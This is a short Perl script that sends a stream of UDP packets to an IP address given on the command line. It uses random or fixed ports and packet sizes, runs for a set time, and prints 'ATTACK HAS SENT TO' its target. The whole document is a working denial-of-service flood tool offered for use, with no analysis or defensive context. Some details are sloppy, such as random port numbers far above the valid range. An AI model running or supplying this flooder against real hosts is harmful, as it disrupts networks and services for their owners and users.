#!/usr/bin/perl

use Socket;
use strict;

my ($ip,$port,$Thread,$time) = @ARGV;

my ($iaddr,$endtime,$pThread,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);


print "ATTACK HAS SENT TO $ip " . ($port ? $port : "random") . 
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $pThread = $Thread ? $Thread : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$pThread","flood"), 0, pack_sockaddr_in($pport, $iaddr));}